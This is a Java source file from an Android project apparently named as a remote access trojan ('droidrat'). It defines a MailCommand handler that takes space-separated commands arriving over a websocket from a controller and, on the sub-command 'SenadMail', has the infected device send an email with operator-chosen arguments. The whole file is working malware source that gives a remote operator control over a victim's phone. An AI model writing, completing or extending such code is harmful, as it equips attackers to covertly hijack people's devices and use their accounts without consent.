package com.je_chen.droidrat_je.command;

import android.content.Context;

import com.je_chen.droidrat_je.command.process_super.CommandFather;
import com.je_chen.droidrat_je.modules.appintent.mail.SendMail;

import static com.je_chen.droidrat_je.service.command.ProcessCommandService.websocket;

public class MailCommand extends CommandFather {

    private Context context;

    private SendMail sendMail;

    public MailCommand(Context context) {
        this.context = context;
        sendMail = new SendMail();
    }

    @Override
    public void send(String value) {
        websocket.send(value);
    }

    @Override
    public void processCommand(String command) {
        try {
            String[] rawCommandArray = command.split(" ");
            switch (rawCommandArray[1]) {

                case "SenadMail":
                    sendMail.sendMail(context, rawCommandArray[2], rawCommandArray[3], rawCommandArray[4]);
                    break;

            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
